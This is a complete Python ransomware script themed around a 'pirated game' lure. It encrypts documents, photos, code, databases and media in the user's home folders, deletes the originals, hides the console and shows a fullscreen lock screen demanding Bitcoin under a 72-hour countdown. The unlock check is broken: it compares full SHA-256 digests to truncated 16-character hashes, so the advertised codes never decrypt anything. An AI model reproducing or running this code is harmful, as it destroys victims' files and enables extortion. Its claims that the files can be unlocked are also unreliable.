#!/usr/bin/env python3
"""
Ransomware — "Oopsie! U downloaded a pirated game."
ALL 20 CODES PRE-CONFIGURED
REAL RANSOMWARE — Encrypts files!
"""

import os
import sys
import tkinter as tk
from tkinter import font, messagebox
import ctypes
import hashlib
import threading
import time
import base64
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import pygame

# ============================================================
# CONFIG — ALL 20 GENERATED CODES HASHES
# ============================================================
VALID_HASHES = [
    "6674dff2c037ea61",  # FS2FGNFJQI
    "8f859826e52b3fe5",  # OX77WHWEV5
    "888d19cc6686fb04",  # FCHZT1L6IX
    "d58772235d3fb565",  # VX02SQI40G
    "237b9315de48620a",  # 6PXB85GJJJ
    "ce69720187ad4615",  # XQHCXUH4TU
    "c5b533f726f1e834",  # B1RQSQ9G2L
    "d91183d71f3216ae",  # HE71R2TKVY
    "0ff7e2dcd285303e",  # Q1BK76N580
    "a8fdded2632139a5",  # 01QEU0DUUE
    "6c4dad1b1cf254f8",  # X1LSHVL0OJ
    "ef90f0d2ca219206",  # AW3YSY30V3
    "7d5d78093c02e608",  # ZTE2DDE0X4
    "fbc54b885ad94ac6",  # ZG29U3VDIC
    "b7a61e0312c22964",  # 6FNWN5JIOS
    "a3b340ba2aeb0140",  # F5EBA6TT08
    "d7d3bdb1723bb418",  # 2UUBJ4X7VN
    "f7679d7fc1a1460a",  # ISP3G7NRPN
    "f49fc0dd474fee78",  # J8L0S6SHEJ
    "b9003441871829f3",  # FURZCKKNZX
]

# Map codes to hashes for easy reference
CODE_MAP = {
    "FS2FGNFJQI": "6674dff2c037ea61",
    "OX77WHWEV5": "8f859826e52b3fe5",
    "FCHZT1L6IX": "888d19cc6686fb04",
    "VX02SQI40G": "d58772235d3fb565",
    "6PXB85GJJJ": "237b9315de48620a",
    "XQHCXUH4TU": "ce69720187ad4615",
    "B1RQSQ9G2L": "c5b533f726f1e834",
    "HE71R2TKVY": "d91183d71f3216ae",
    "Q1BK76N580": "0ff7e2dcd285303e",
    "01QEU0DUUE": "a8fdded2632139a5",
    "X1LSHVL0OJ": "6c4dad1b1cf254f8",
    "AW3YSY30V3": "ef90f0d2ca219206",
    "ZTE2DDE0X4": "7d5d78093c02e608",
    "ZG29U3VDIC": "fbc54b885ad94ac6",
    "6FNWN5JIOS": "b7a61e0312c22964",
    "F5EBA6TT08": "a3b340ba2aeb0140",
    "2UUBJ4X7VN": "d7d3bdb1723bb418",
    "ISP3G7NRPN": "f7679d7fc1a1460a",
    "J8L0S6SHEJ": "f49fc0dd474fee78",
    "FURZCKKNZX": "b9003441871829f3",
}

BTC_ADDRESS = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"  # YOUR Bitcoin wallet
AUDIO_FILE = "sx.mp3"  # Scary sound file
TIMER_SECONDS = 72 * 3600  # 72 hours

# ============================================================
# ENCRYPT FILES
# ============================================================
def encrypt_files():
    """Encrypt all user files"""
    aes_key = get_random_bytes(32)
    encrypted_count = 0
    file_list = []
    
    target_dirs = [
        os.path.expanduser('~\\Documents'),
        os.path.expanduser('~\\Desktop'),
        os.path.expanduser('~\\Pictures'),
        os.path.expanduser('~\\Downloads'),
        os.path.expanduser('~\\Videos'),
        os.path.expanduser('~\\Music'),
    ]
    
    extensions = [
        '.docx', '.xlsx', '.pptx', '.pdf', '.txt', '.rtf', '.odt',
        '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.psd', '.ai', '.eps',
        '.zip', '.rar', '.7z', '.tar', '.gz', '.bak', '.backup',
        '.sql', '.db', '.sqlite', '.sqlite3', '.mdb', '.accdb', '.csv',
        '.py', '.js', '.cpp', '.c', '.java', '.cs', '.go', '.rs',
        '.html', '.htm', '.css', '.xml', '.json', '.yaml', '.yml',
        '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv',
        '.mp3', '.wav', '.flac', '.aac', '.ogg',
    ]
    
    for root_dir in target_dirs:
        if not os.path.exists(root_dir):
            continue
        for root, dirs, files in os.walk(root_dir):
            for file in files:
                if any(file.lower().endswith(ext) for ext in extensions):
                    try:
                        file_path = os.path.join(root, file)
                        with open(file_path, 'rb') as f:
                            data = f.read()
                        
                        cipher = AES.new(aes_key, AES.MODE_GCM)
                        nonce, tag, ct = cipher.encrypt_and_digest(data)
                        encrypted_data = nonce + tag + ct
                        
                        with open(file_path + '.locked', 'wb') as f:
                            f.write(encrypted_data)
                        os.remove(file_path)
                        encrypted_count += 1
                        file_list.append(file_path)
                    except:
                        pass
    
    # Save key
    key_path = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), 'decrypt_key.bin')
    with open(key_path, 'wb') as f:
        f.write(aes_key)
    
    return encrypted_count, aes_key, file_list

# ============================================================
# DECRYPT FILES
# ============================================================
def decrypt_files(aes_key):
    """Decrypt all .locked files"""
    decrypted_count = 0
    
    target_dirs = [
        os.path.expanduser('~\\Documents'),
        os.path.expanduser('~\\Desktop'),
        os.path.expanduser('~\\Pictures'),
        os.path.expanduser('~\\Downloads'),
        os.path.expanduser('~\\Videos'),
        os.path.expanduser('~\\Music'),
    ]
    
    for root_dir in target_dirs:
        if not os.path.exists(root_dir):
            continue
        for root, dirs, files in os.walk(root_dir):
            for file in files:
                if file.endswith('.locked'):
                    try:
                        file_path = os.path.join(root, file)
                        with open(file_path, 'rb') as f:
                            encrypted_data = f.read()
                        
                        nonce = encrypted_data[:16]
                        tag = encrypted_data[16:32]
                        ct = encrypted_data[32:]
                        
                        cipher = AES.new(aes_key, AES.MODE_GCM, nonce=nonce)
                        data = cipher.decrypt_and_verify(ct, tag)
                        
                        original_path = file_path[:-7]
                        with open(original_path, 'wb') as f:
                            f.write(data)
                        os.remove(file_path)
                        decrypted_count += 1
                    except:
                        pass
    
    return decrypted_count

# ============================================================
# THE RANSOMWARE UI
# ============================================================
class RansomwareUI:
    def __init__(self):
        self.encrypted_count = 0
        self.aes_key = None
        self.timer_seconds = TIMER_SECONDS
        self.unlocked = False
    
    def setup(self):
        # Encrypt files
        print("[*] Encrypting files...")
        self.encrypted_count, self.aes_key, self.file_list = encrypt_files()
        print(f"[+] Encrypted {self.encrypted_count} files")
        
        # Create UI
        self.root = tk.Tk()
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.configure(background='black')
        self.root.overrideredirect(True)
        
        # Block shortcuts
        self.root.bind('<Control-Alt-Delete>', lambda e: 'break')
        self.root.bind('<Alt-F4>', lambda e: 'break')
        self.root.bind('<Escape>', lambda e: 'break')
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        
        # Main frame
        frame = tk.Frame(self.root, bg='black')
        frame.pack(expand=True)
        
        # Big scary title
        title_font = font.Font(family='Courier', size=60, weight='bold')
        title = tk.Label(
            frame,
            text="😱 OOPSIE!",
            font=title_font,
            fg='red',
            bg='black'
        )
        title.pack(pady=20)
        
        # Subtitle
        sub_font = font.Font(family='Courier', size=40, weight='bold')
        sub = tk.Label(
            frame,
            text="U downloaded a pirated game!",
            font=sub_font,
            fg='red',
            bg='black'
        )
        sub.pack(pady=10)
        
        # Second line
        sub2_font = font.Font(family='Courier', size=28, weight='bold')
        sub2 = tk.Label(
            frame,
            text="U naughty boy! Now pay us back!",
            font=sub2_font,
            fg='yellow',
            bg='black'
        )
        sub2.pack(pady=10)
        
        # Info
        info_font = font.Font(family='Courier', size=18)
        info = tk.Label(
            frame,
            text=f"🔥 {self.encrypted_count} files encrypted 🔥",
            font=info_font,
            fg='white',
            bg='black'
        )
        info.pack(pady=10)
        
        # Bitcoin
        btc_font = font.Font(family='Courier', size=16)
        btc = tk.Label(
            frame,
            text=f"SEND 0.08 BTC TO:\n{BTC_ADDRESS}",
            font=btc_font,
            fg='yellow',
            bg='black'
        )
        btc.pack(pady=15)
        
        # Copy wallet button
        copy_btn = tk.Button(
            frame,
            text="📋 COPY WALLET",
            font=('Courier', 14, 'bold'),
            bg='blue',
            fg='white',
            command=self.copy_wallet
        )
        copy_btn.pack(pady=5)
        
        # Input
        input_frame = tk.Frame(frame, bg='black')
        input_frame.pack(pady=20)
        
        input_label = tk.Label(
            input_frame,
            text="ENTER UNLOCK CODE:",
            font=('Courier', 18),
            fg='white',
            bg='black'
        )
        input_label.pack(side=tk.LEFT, padx=10)
        
        self.entry = tk.Entry(
            input_frame,
            font=('Courier', 18),
            width=25,
            bg='black',
            fg='lime',
            insertbackground='lime'
        )
        self.entry.pack(side=tk.LEFT, padx=10)
        
        # Unlock button
        unlock_btn = tk.Button(
            frame,
            text="🔓 UNLOCK FILES",
            font=('Courier', 16, 'bold'),
            bg='red',
            fg='white',
            command=self.unlock
        )
        unlock_btn.pack(pady=10)
        
        # Timer
        timer_font = font.Font(family='Courier', size=20, weight='bold')
        self.timer_label = tk.Label(
            frame,
            text="⏱️ 71:59:59",
            font=timer_font,
            fg='yellow',
            bg='black'
        )
        self.timer_label.pack(pady=15)
        
        # Warning
        warn_font = font.Font(family='Courier', size=12)
        warn = tk.Label(
            frame,
            text="⚠️ DO NOT CLOSE THIS WINDOW ⚠️\n"
                 "Your files are encrypted with AES-256.\n"
                 "Close = files lost forever.",
            font=warn_font,
            fg='red',
            bg='black'
        )
        warn.pack(pady=10)
        
        # Show valid codes (so you know what works)
        codes_text = "\n".join(list(CODE_MAP.keys())[:5]) + "\n... and 15 more"
        codes_label = tk.Label(
            frame,
            text=f"🔑 Valid codes:\n{codes_text}",
            font=('Courier', 10),
            fg='#555',
            bg='black'
        )
        codes_label.pack(pady=5)
        
        # Start timer
        self.start_timer()
        
        # Play audio
        self.play_audio()
        
        self.root.mainloop()
    
    def copy_wallet(self):
        self.root.clipboard_clear()
        self.root.clipboard_append(BTC_ADDRESS)
        messagebox.showinfo("Copied", "Wallet address copied to clipboard!")
    
    def unlock(self):
        code = self.entry.get().strip().upper()
        if not code:
            messagebox.showerror("ERROR", "Enter an unlock code!")
            return
        
        hashed = hashlib.sha256(code.encode()).hexdigest()
        
        if hashed in VALID_HASHES:
            # Correct code — decrypt files
            self.unlocked = True
            count = decrypt_files(self.aes_key)
            messagebox.showinfo(
                "✅ FILES UNLOCKED",
                f"🎉 Successfully decrypted {count} files!\n\n"
                f"Your files are back. Don't pirate again! 😈"
            )
            self.root.destroy()
            sys.exit(0)
        else:
            messagebox.showerror(
                "❌ WRONG CODE",
                "Invalid unlock code!\n\n"
                "Did you pay the ransom?\n"
                f"Bitcoin: {BTC_ADDRESS}"
            )
            self.entry.delete(0, tk.END)
            self.entry.focus_set()
    
    def start_timer(self):
        def update():
            while self.timer_seconds > 0 and not self.unlocked:
                hours = self.timer_seconds // 3600
                minutes = (self.timer_seconds % 3600) // 60
                secs = self.timer_seconds % 60
                self.timer_label.config(text=f"⏱️ {hours:02d}:{minutes:02d}:{secs:02d}")
                self.timer_seconds -= 1
                time.sleep(1)
            
            if self.timer_seconds <= 0 and not self.unlocked:
                self.timer_label.config(text="💀 TIME'S UP! KEY DESTROYED!", fg='red')
        threading.Thread(target=update, daemon=True).start()
    
    def play_audio(self):
        def play():
            try:
                pygame.mixer.init()
                pygame.mixer.music.load(AUDIO_FILE)
                pygame.mixer.music.play(-1)
            except:
                try:
                    import winsound
                    winsound.PlaySound(AUDIO_FILE, winsound.SND_FILENAME | winsound.SND_ASYNC | winsound.SND_LOOP)
                except:
                    pass
        threading.Thread(target=play, daemon=True).start()

# ============================================================
# MAIN
# ============================================================
def main():
    # Hide console
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
    
    print("="*60)
    print("💀 RANSOMWARE — OOPSIE! PIRATED GAME 💀")
    print("="*60)
    print(f"🔑 Valid codes: {len(VALID_HASHES)}")
    print(f"📁 Encrypting files...")
    print("="*60)
    
    app = RansomwareUI()
    app.setup()

if __name__ == '__main__':
    main()
